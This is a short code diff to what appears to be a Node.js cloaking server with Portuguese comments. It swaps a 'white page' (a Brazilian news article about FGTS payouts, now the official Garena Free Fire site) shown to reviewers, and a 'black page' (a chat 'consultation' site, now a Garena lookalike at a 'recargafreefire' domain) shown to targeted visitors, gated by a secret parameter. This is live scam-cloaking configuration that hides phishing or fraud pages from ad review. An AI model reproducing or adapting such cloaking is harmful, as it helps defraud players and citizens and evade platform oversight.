@@ -6,9 +6,9 @@ const port = process.env.PORT || 3000;
 // Configurações das páginas
 const whitePage =
   process.env.WHITE_PAGE ||
-  "https://agenciabrasil.ebc.com.br/radioagencia-nacional/economia/audio/2024-08/trabalhadores-vao-receber-parte-do-lucro-de-r-152-bilhoes-do-fgts";
+  "https://ff.garena.com/pt/";
 const blackPage =
-  process.env.BLACK_PAGE || "https://www.cidadaoconsulta.chat/chat/";
+  process.env.BLACK_PAGE || "https://recargafreefire.fun/gaarena/";
 
 // Parâmetros de segurança
 const securityParamName = process.env.SECURITY_PARAM_NAME || "JS1CLdcHVbKA";
